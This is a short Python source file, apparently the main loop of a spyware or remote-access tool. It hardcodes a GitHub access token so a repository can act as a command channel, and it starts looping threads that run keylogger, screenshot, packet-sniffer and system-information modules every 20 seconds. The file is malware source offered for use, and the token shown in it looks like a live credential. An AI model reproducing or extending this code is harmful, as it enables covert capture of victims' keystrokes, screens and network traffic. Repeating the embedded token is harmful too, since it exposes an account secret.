from github import Github
access_token = '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'
g = Github(access_token)
user = g.get_user()
repo = user.get_repo('python_development')


from keylogger import Keylogger
from sysinfo import SysInfo
from screenshot import Screenshot
from sniffer import Sniffer
import psutil
import time
import json
import threading

#def command_listener():
    #contents = repo.get_contents("commands.json")
    #return contents.decoded_content

def mod_keylogger():
    k = Keylogger()
    k.keylogger()

def mod_sysinfo():
    s = SysInfo()
    s.get_usage(psutil.cpu_percent(), psutil.virtual_memory().percent,30)
    time.sleep(0.5)

def mod_screenshotter():
    s = Screenshot()
    s.auto_screen()

def mod_sniffer():
    s = Sniffer()
    s.start_sniffing()

def start_program(module_func, interval):
    while True:
        module_func()
        time.sleep(interval)
    
screenshot_thread = threading.Thread(target=start_program, args=(mod_screenshotter, 20))
sysinfo_thread = threading.Thread(target=start_program, args=(mod_sysinfo,20))
sniffer_thread = threading.Thread(target=start_program, args=(mod_sniffer,20))
keylogger_thread = threading.Thread(target=start_program, args=(mod_keylogger,20))
screenshot_thread.start()
sysinfo_thread.start()
sniffer_thread.start()
keylogger_thread.start()



